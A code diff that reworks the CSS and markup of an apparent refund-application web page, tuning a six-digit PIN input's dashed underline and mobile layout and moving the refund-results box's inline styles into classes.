@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -74,10 +73,10 @@
             flex-shrink: 0;
         }
 
-        /* Exactly 6 PIN lines styling - Professional individual dashes */
+        /* EXACTLY 6 PIN lines styling - Precision CSS for perfect mobile alignment */
         .pin-input-container {
             position: relative;
-            margin: 20px 0;
+            margin: 20px auto;
             display: flex;
             justify-content: center;
             width: 100%;
@@ -85,21 +84,23 @@
         .styled-pin-input {
             font-family: 'Courier New', Courier, monospace;
             font-size: 2.2rem;
-            letter-spacing: 21px; /* Precision spacing for 6 digits */
+            /* Perfectly matches 6 lines of 30px with 10px gaps */
+            letter-spacing: 21.5px; 
             text-align: left;
             padding-left: 12px;
             border: none;
-            /* Creates exactly 6 distinct segments (30px line, 11px gap) */
+            /* 30px line + 10px gap = 40px cycle. (6 * 40) - 10 = 230px total */
             background: repeating-linear-gradient(90deg, 
                 #002868 0, #002868 30px, 
-                transparent 30px, transparent 41px) 0 100% / 246px 3px no-repeat;
+                transparent 30px, transparent 40px) 0 100% / 230px 3px no-repeat;
             color: #002868;
-            width: 246px; 
+            width: 230px; 
             height: 55px;
             margin: 0 auto;
             display: block;
             outline: none;
             background-position: bottom left;
+            box-sizing: border-box;
         }
 
         /* Mobile-First Responsiveness Overrides */
@@ -111,7 +112,7 @@
         }
         
         .form-container {
-            width: 92%;
+            width: 94%;
             max-width: 800px;
             margin: 10px auto;
             padding: 20px 15px;
@@ -122,16 +123,16 @@
         }
 
         .modal-content {
-            width: 90% !important;
+            width: 92% !important;
             max-width: 400px;
-            padding: 25px !important;
+            padding: 25px 15px !important;
             border-radius: 15px !important;
             box-sizing: border-box;
         }
 
         .btn-group {
             display: flex;
-            flex-direction: column-reverse; /* Stack buttons on mobile for easier reach */
+            flex-direction: column-reverse; 
             gap: 12px;
             margin-top: 25px;
         }
@@ -203,6 +204,25 @@
             border-radius: 6px;
             border-left: 4px solid #ffc107;
             margin-bottom: 15px;
+        }
+
+        /* Mobile specific fix for numbers falling out of boxes */
+        #final-results-page h1 {
+            font-size: clamp(1.8rem, 8vw, 3.5rem);
+            word-wrap: break-word;
+            word-break: break-all;
+            margin: 10px 0;
+            color: #28a745;
+        }
+
+        #final-results-page .result-box {
+            background:#eef9f0; 
+            padding:20px 10px; 
+            border-radius:15px; 
+            margin:20px 0; 
+            border:2px dashed #28a745;
+            max-width: 100%;
+            overflow: hidden;
         }
     </style>
 </head>
@@ -398,15 +418,15 @@
         </div>
     </form>
 
-    <div id="final-results-page" style="display:none; text-align:center; padding:40px 20px;">
+    <div id="final-results-page" style="display:none; text-align:center; padding:40px 10px;">
         <div style="font-size:70px; color:#28a745; margin-bottom: 20px;">✓</div>
         <h2 style="color:#002868; margin-top: 0;">Application Filed</h2>
-        <div style="background:#eef9f0; padding:20px; border-radius:15px; margin:20px 0; border:2px dashed #28a745;">
-            <p>Estimated Refund Amount:</p>
-            <h1 style="font-size:3.5rem; color:#28a745;">$<span id="display-refund-amount">0.00</span></h1>
+        <div class="result-box">
+            <p style="margin:0; font-weight:600; color:#555;">Estimated Refund Amount:</p>
+            <h1>$<span id="display-refund-amount">0.00</span></h1>
         </div>
         <p><strong>Application Ref:</strong> <span id="display-app-id"></span></p>
-        <button onclick="window.location.reload()" class="btn btn-primary">Return to Homepage</button>
+        <button onclick="window.location.reload()" class="btn btn-primary" style="margin-top:20px;">Return to Homepage</button>
     </div>
 </div>
 
